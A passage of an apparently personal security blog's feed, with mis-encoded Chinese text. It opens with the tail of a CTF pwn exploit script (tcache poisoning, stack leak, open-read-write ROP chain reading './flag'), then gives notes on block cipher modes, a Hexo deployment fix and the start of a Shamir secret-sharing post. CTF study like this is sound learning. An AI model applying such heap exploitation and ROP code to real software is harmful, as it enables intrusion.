= libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ†ç»„å¯†ç çš„äº”ç§å·¥ä½œæ¨¡å¼</title>
    <link href="/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic-Codebook-ECB"><a href="#ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic-Codebook-ECB" class="headerlink" title="ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic Codebook, ECB"></a>ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic Codebook, ECB</h2><blockquote><p>æ˜æ–‡åˆ†æˆ64çš„åˆ†ç»„è¿›è¡ŒåŠ å¯†ï¼Œå¿…è¦æ—¶å¡«å……ï¼Œæ¯ä¸ªåˆ†ç»„ç”¨åŒä¸€å¯†é’¥åŠ å¯†ï¼ŒåŒæ ·æ˜æ–‡åˆ†ç»„åŠ å¯†å¾—ç›¸åŒå¯†æ–‡</p></blockquote><h3 id="ç¤ºæ„å›¾"><a href="#ç¤ºæ„å›¾" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry1.png" alt="ECB"></p><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><ul><li>ECBæ¨¡å¼ç‰¹åˆ«é€‚åˆæ•°æ®è¾ƒå°‘çš„æƒ…å†µï¼Œå¦‚å®‰å…¨ä¼ è¾“DESå¯†é’¥</li><li>ä¸€æ®µæ˜æ–‡æ¶ˆæ¯ä¸­è‹¥æœ‰å‡ ä¸ªç›¸åŒçš„æ˜æ–‡ç»„ï¼Œåˆ™å¯†æ–‡ä¹Ÿå°†å‡ºç°å‡ ä¸ªç›¸åŒçš„ç‰‡æ®µ</li><li>å¯¹äºå¾ˆé•¿çš„æ¶ˆæ¯ï¼ŒECBæ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœæ¶ˆæ¯æ˜¯éå¸¸ç»“æ„åŒ–çš„ï¼Œå¯†ç åˆ†æå¯èƒ½åˆ©ç”¨å…¶ç»“æ„ç‰¹å¾æ¥ç ´è§£</li><li>ECBçš„å¼±ç‚¹æ¥æºäºå…¶åŠ å¯†è¿‡çš„å¯†æ–‡åˆ†ç»„æ˜¯äº’ç›¸ç‹¬ç«‹çš„</li></ul><h2 id="å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher-Block-Chaining-CBC"><a href="#å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher-Block-Chaining-CBC" class="headerlink" title="å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher Block Chaining (CBC)"></a>å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher Block Chaining (CBC)</h2><blockquote><p>åŠ å¯†è¾“å…¥æ˜¯å½“å‰æ˜æ–‡åˆ†ç»„å’Œå‰ä¸€å¯†æ–‡åˆ†ç»„çš„å¼‚æˆ–ï¼Œå½¢æˆä¸€æ¡é“¾ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œ è¿™æ ·æ¯ä¸ªæ˜æ–‡åˆ†ç»„çš„åŠ å¯†å‡½æ•°è¾“å…¥ä¸æ˜æ–‡åˆ†ç»„ä¹‹é—´ä¸å†æœ‰å›ºå®šçš„å…³ç³»</p></blockquote><h3 id="ç¤ºæ„å›¾-1"><a href="#ç¤ºæ„å›¾-1" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry2.png" alt="CBC"></p><h3 id="ä¼˜ç‚¹å’Œå±€é™"><a href="#ä¼˜ç‚¹å’Œå±€é™" class="headerlink" title="ä¼˜ç‚¹å’Œå±€é™"></a>ä¼˜ç‚¹å’Œå±€é™</h3><ul><li>æ¯ä¸ªå¯†æ–‡åˆ†ç»„ä¾èµ–äºå…¶ä»–æ˜æ–‡åˆ†ç»„ </li><li>æ˜æ–‡æ¶ˆæ¯ä¸­çš„ä»»ä½•ä¸€ç‚¹å˜åŒ–éƒ½ä¼šå½±å“å¯†æ–‡åˆ†ç»„ </li><li>å‘é€æ–¹å’Œæ¥æ”¶æ–¹éœ€è¦å…±äº«åˆå§‹å‘é‡Initial Value(IV)<ul><li>å¦‚æœIVè¢«æ˜æ–‡ä¼ é€ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ”¹å˜ç¬¬ä¸€ä¸ªåˆ†ç»„çš„æŸäº›ä½ï¼Œç„¶åé¢„å…ˆæ”¹å˜IVä¸­çš„æŸäº›ä½ï¼Œåˆ™æ¥æ”¶è€…æ”¶åˆ°çš„P1ä¹Ÿå°±ç›¸åº”æ”¹å˜äº†</li><li>å› æ­¤ï¼ŒIVå¿…é¡»æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼æˆ–è€…å¿…é¡»ç”¨ECBæ–¹å¼åœ¨æ¶ˆæ¯ä¹‹å‰åŠ å¯†ä¼ é€</li></ul></li><li>åœ¨æ¶ˆæ¯çš„æœ€åï¼Œè¿˜è¦å¤„ç†ä¸å¤Ÿé•¿åº¦çš„åˆ†ç»„ <ul><li>å¯ä»¥å¡«å……å·²çŸ¥éæ•°æ®å€¼ï¼Œæˆ–è€…åœ¨æœ€åä¸€å—è¡¥ä¸Šå¡«å……ä½é•¿åº¦</li></ul></li></ul><h2 id="å¯†ç åé¦ˆæ¨¡å¼Cipher-FeedBack-CFB"><a href="#å¯†ç åé¦ˆæ¨¡å¼Cipher-FeedBack-CFB" class="headerlink" title="å¯†ç åé¦ˆæ¨¡å¼Cipher FeedBack (CFB)"></a>å¯†ç åé¦ˆæ¨¡å¼Cipher FeedBack (CFB)</h2><blockquote><ul><li>æ˜¯ä¸€ç§å°†DESè½¬åŒ–æˆæµå¯†ç çš„æŠ€æœ¯ï¼Œä¸å†è¦æ±‚æŠ¥æ–‡è¢«å¡«å……æˆæ•´ä¸ªåˆ†ç»„ï¼Œå¯ä»¥å®æ—¶è¿è¡Œï¼Œå¦‚æœè¦ä¼ è¾“ä¸€ä¸ªå­—ç¬¦æµï¼Œæ¯ä¸ªå­—ç¬¦éƒ½å¯ä»¥ä½¿ç”¨é¢å‘å­—ç¬¦çš„æµå¯†ç åŠ å¯†åç«‹å³ä¼ è¾“ã€‚</li><li>åŠ å¯†ï¼šåŠ å¯†å‡½æ•°çš„è¾“å…¥æ˜¯ä¸€ä¸ª64ä½çš„ç§»ä½å¯„å­˜å™¨ï¼Œäº§ç”Ÿåˆå§‹å‘é‡IVã€‚åŠ å¯†å‡½æ•°é«˜ç«¯jä½ä¸æ˜æ–‡P1çš„ç¬¬ä¸€å•å…ƒå¼‚æˆ–ï¼Œäº§ç”Ÿjä½å¯†æ–‡C1è¿›å…¥ç§»ä½å¯„å­˜å™¨ä½ç«¯ï¼Œç»§ç»­åŠ å¯†ï¼Œä¸P2è¾“å…¥å¼‚æˆ–ï¼Œå¦‚æ­¤é‡å¤ç›´åˆ°æ‰€æœ‰æ˜æ–‡å•å…ƒéƒ½å®ŒæˆåŠ å¯†ã€‚</li><li>è§£å¯†ï¼šé‡‡ç”¨ç›¸åŒæ–¹æ¡ˆï¼Œä½†æ˜¯ä½¿ç”¨åŠ å¯†å‡½æ•°è€Œéè§£å¯†å‡½æ•°</li></ul></blockquote><h3 id="ç¤ºæ„å›¾-2"><a href="#ç¤ºæ„å›¾-2" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry3.png" alt="CFB"></p><h3 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>å½“æ•°æ®ä»¥ä½æˆ–å­—èŠ‚å½¢å¼åˆ°è¾¾æ—¶ä½¿ç”¨éƒ½æ˜¯é€‚å½“çš„ </li><li>æœ€é€šç”¨çš„æ˜¯æµå¯†ç å½¢å¼</li></ul><h2 id="è¾“å‡ºåé¦ˆæ¨¡å¼Output-FeedBack-OFB"><a href="#è¾“å‡ºåé¦ˆæ¨¡å¼Output-FeedBack-OFB" class="headerlink" title="è¾“å‡ºåé¦ˆæ¨¡å¼Output FeedBack (OFB)"></a>è¾“å‡ºåé¦ˆæ¨¡å¼Output FeedBack (OFB)</h2><blockquote><p>ç»“æ„ä¸Šç±»ä¼¼CFBï¼Œä½†æ˜¯OFBä¸­åŠ å¯†å‡½æ•°è¾“å‡ºè¢«åé¦ˆå›ç§»ä½å¯„å­˜å™¨ï¼ŒCFBä¸­æ˜¯å¯†æ–‡å•å…ƒè¢«åé¦ˆå›ç§»ä½å¯„å­˜å™¨ã€‚ä¼˜ç‚¹æ˜¯ä¼ è¾“ä¸­çš„æ¯”ç‰¹å·®é”™ä¸ä¼šä¼ æ’­ï¼Œç¼ºç‚¹æ˜¯æ¯”CFBæ›´å®¹æ˜“å—æŠ¥æ–‡æµç¯¡æ”¹æ”»å‡»ã€‚</p></blockquote><h3 id="ç¤ºæ„å›¾-3"><a href="#ç¤ºæ„å›¾-3" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry4.png" alt="OFB"></p><h3 id="ä¼˜ç¼ºç‚¹-1"><a href="#ä¼˜ç¼ºç‚¹-1" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>OFBçš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯ä¼ è¾“è¿‡ç¨‹ä¸­åœ¨æŸä½ä¸Šå‘ç”Ÿçš„é”™è¯¯ä¸ä¼šå½±å“åˆ°å…¶ä»–ä½ã€‚æ¯”å¦‚ï¼ŒC1ä¸­æœ‰1ä½å‘ç”Ÿäº†é”™è¯¯ï¼Œåªä¼šå½±å“åˆ°P1çš„æ¢å¤ï¼Œåç»­çš„æ˜æ–‡å•å…ƒä¸å—å½±å“ã€‚</li><li>OFBçš„ç¼ºç‚¹æ˜¯ï¼ŒæŠ—æ¶ˆæ¯æµç¯¡æ”¹æ”»å‡»çš„èƒ½åŠ›ä¸å¦‚CFBã€‚å³å¯†æ–‡ä¸­çš„æŸä½å–åï¼Œæ¢å¤å‡ºçš„æ˜æ–‡ç›¸åº”ä½ä¹Ÿå–å</li></ul><h2 id="è®¡æ•°å™¨æ¨¡å¼Counter-CTR"><a href="#è®¡æ•°å™¨æ¨¡å¼Counter-CTR" class="headerlink" title="è®¡æ•°å™¨æ¨¡å¼Counter (CTR)"></a>è®¡æ•°å™¨æ¨¡å¼Counter (CTR)</h2><blockquote><ul><li>æ˜¯ä¸€ç§æ–°æ¨¡å¼ï¼Œè™½ç„¶æ—©å°±æå‡ºæ¥äº†</li><li>ä¸OFBå¾ˆåƒï¼Œä½†æ˜¯åŠ å¯†çš„æ˜¯è®¡æ•°å™¨çš„å€¼è€Œä¸æ˜¯ä»»ä½•åé¦ˆå›æ¥çš„å€¼</li><li>æ¯ä¸€ä¸ªæ˜æ–‡åˆ†ç»„éƒ½å¿…é¡»ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„å¯†é’¥å’Œè®¡æ•°å™¨å€¼ï¼Œå†³ä¸è¦é‡å¤ä½¿ç”¨Ci &#x3D; Pi XOR Oi Oi &#x3D; DESK1(i)</li><li>å¯ä»¥ç”¨äºé«˜é€Ÿç½‘ç»œåŠ å¯†ä¸­</li></ul></blockquote><h3 id="ç¤ºæ„å›¾-4"><a href="#ç¤ºæ„å›¾-4" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry5.png" alt="CTR"></p><h3 id="ä¼˜ç¼ºç‚¹-2"><a href="#ä¼˜ç¼ºç‚¹-2" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>é«˜æ•ˆ<ul><li>å¯ä»¥åšå¹¶è¡ŒåŠ å¯†</li><li>å¯¹é«˜é€Ÿé“¾è·¯çš„çªå‘æ•°æ®åŠ å¯†å°¤å…¶æœ‰æ•ˆ</li></ul></li><li>å¯ä»¥å¯¹è¢«åŠ å¯†çš„åˆ†ç»„è¿›è¡Œéšæœºå­˜å–</li><li>ç›¸å½“å®‰å…¨</li><li>ç®€æ´</li><li>å¿…é¡»å†³ä¸é‡å¤ä½¿ç”¨å¯†é’¥å’Œè®¡æ•°å™¨å€¼</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexoéƒ¨ç½²å‡ºç°é”™è¯¯ Error Spawn failed è§£å†³æ–¹å¼(code 128)</title>
    <link href="/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <url>/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>è®°å½•ä¸€æ¬¡æŠ¥é”™å¤„ç†æ–¹å¼ï¼Œåœ¨æ›´æ–°äº†è‡ªå·±çš„å¿…è¯»ä¹¦ç›®ä¹‹åï¼Œæ‰§è¡Œ hexo clean &amp;&amp; hexo g -d æ—¶å‡ºç°å¦‚ä¸‹é”™è¯¯</p></blockquote><h2 id="é”™è¯¯ä¿¡æ¯ä¸€"><a href="#é”™è¯¯ä¿¡æ¯ä¸€" class="headerlink" title="é”™è¯¯ä¿¡æ¯ä¸€"></a>é”™è¯¯ä¿¡æ¯ä¸€</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>remote: No anonymous write access.<br>fatal: Authentication failed <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><p>ä¸€ã€æ‰“å¼€vscodeè®¾ç½®ç•Œé¢ï¼Œæœç´¢git.terminal Authenticationï¼Œå°†ä»–å‰é¢çš„ âˆš å»æ‰</p><p><img src="/img/article/error128/vscode1.png" alt="image-20220607164521802"></p><p>äºŒã€crtl + shift + p æ‰“å¼€æœç´¢æ¡†ï¼Œæœç´¢reload windowå¹¶è¿è¡Œ</p><p><img src="/img/article/error128/vscode2.png" alt="image-20220607164739265"></p><p>ä¸‰ã€å†æ¬¡å°è¯•hexo gï¼Œè§£å†³æˆåŠŸ</p><p><img src="/img/article/error128/vscode3.png" alt="image-20220607164850847"></p><h2 id="é”™è¯¯ä¿¡æ¯äºŒ"><a href="#é”™è¯¯ä¿¡æ¯äºŒ" class="headerlink" title="é”™è¯¯ä¿¡æ¯äºŒ"></a>é”™è¯¯ä¿¡æ¯äºŒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span>: gnutls_handshake() failed: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>.<br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•-1"><a href="#è§£å†³æ–¹æ³•-1" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><p>æ‰“å¼€_config.ymlæ–‡ä»¶ï¼Œæ›´æ”¹httpsä»“åº“åœ°å€ä¸ºsshåœ°å€,é…ç½®sshå¯†é’¥å³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span><span class="hljs-string">https://github.com/YourName/YourName.github.io.git(ä¸è¦ä½¿ç”¨è¿™ä¸ª)</span><br>  <span class="hljs-string">git@github.com:YourName/YourName.github.io.git(ç”¨è¿™ä¸ª)</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonå®ç°shamiråŠ å¯†å’Œå›¾åƒåŠ å¯†éšå†™</title>
    <link href="/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/"/>
    <url>/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸Šæœºä½œä¸šç½¢äº†ï¼Œäººå·²ç»éº»äº†</p></blockquote><h2 id="shamirç§˜å¯†å…±äº«åè®®"><a href="#shamirç§˜å¯†å…±äº«åè®®" class="headerlink" title="shamirç§˜å¯†å…±äº«åè®®"></a>shamirç§˜å¯†å…±äº«åè®®</h2><h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p>å‡è®¾æœ‰ç§˜å¯†Sè¦ä¿æŠ¤ï¼Œä»»æ„å–t-1ä¸ªéšæœºæ•°ï¼Œæ„é€ å¦‚ä¸‹å¤šé¡¹å¼ï¼š <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[å…¬å¼]"> ï¼Œå…¶ä¸­ï¼Œ <img src="https://www.zhihu.com/equation?tex=a_0=S" alt="[å…¬å¼]"> ï¼Œæ‰€æœ‰è¿ç®—å‡åœ¨æœ‰æœ‰é™åŸŸä¸­è¿›è¡Œã€‚</p><ul><li>å–ä»»æ„nä¸ªæ•°ï¼Œ <img src="https://www.zhihu.com/equation?tex=x_1,x_2,%5Ccdots,x_n" alt="[å…¬å¼]"> åˆ†åˆ«å¸¦å…¥å¤šé¡¹å¼ï¼Œå¾—åˆ° <img src="https://www.zhihu.com/equation?tex=f(x_1),f(x_2),%5Ccdots+f(x_n)" alt="[å…¬å¼]"> ã€‚</li><li>å°† <img src="https://www.zhihu.com/equation?tex=(x_1,f(x_1)),%5Ccdots+,(x_n,f(x_n))" alt="[å…¬å¼]"> åˆ†å‘ç»™nä¸ªæœåŠ¡å™¨ä¸Šã€‚</li></ul><h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><p>ä»ä»»æ„tä¸ªæœåŠ¡å™¨ä¸Šå–å¾—æ•°æ®ï¼Œå‡è®¾å–å¾— <img src="https://www.zhihu.com/equation?tex=(x_1,y_1),%5Ccdots+,(x_t,y_t)" alt="[å…¬å¼]"> ï¼Œå¸¦å…¥å¹¶æ±‚è§£å¤šé¡¹å¼ç³»æ•°ï¼›<br><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Baligned%7D+a_0+a_1x_1+%5Ccdots+,a_%7Bt-1%7Dx_1%5E%7Bt-1%7D=y_1+%5C%5C+a_0+a_1x_2+%5Ccdots+,a_%7Bt-1%7Dx_2%5E%7Bt-1%7D=y_2+%5C%5C+%5Ccdots+%5C%5C+a_0+a_1x_t+%5Ccdots+,a_%7Bt-1%7Dx_%7Bt%7D%5E%7Bt-1%7D=y_%7Bt%7D+%5C%5C+%5Cend%7Baligned%7D" alt="[å…¬å¼]"><br>ç”¨çŸ©é˜µä¹˜æ³•è¡¨ç¤ºä¸ºï¼š<br><img src="/img/article/shamir/matrix.png" alt="img"><br>åœ¨æ±‚å¾— <img src="https://www.zhihu.com/equation?tex=a_0,a_1,%5Ccdots,a_%7Bt-1%7D" alt="[å…¬å¼]"> ä¹‹åä¾¿å¯ä»¥æ„é€ å‡ºå¤šé¡¹å¼ <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[å…¬å¼]"></p><p>å°† <img src="https://www.zhihu.com/equation?tex=x=0" alt="[å…¬å¼]"> å¸¦å…¥åˆ°å¤šé¡¹å¼ä¸­ï¼Œå¯ä»¥æ±‚çš„åŸç§˜å¯† <img src="https://www.zhihu.com/equation?tex=S=a_0" alt="[å…¬å¼]"></p><h3 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> decimal <span class="hljs-keyword">import</span> Decimal<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment">##æµ‹è¯•æ•°æ®</span><br><span class="hljs-built_in">max</span> = <span class="hljs-number">1000000</span><br>t = <span class="hljs-number">5</span><br>n = <span 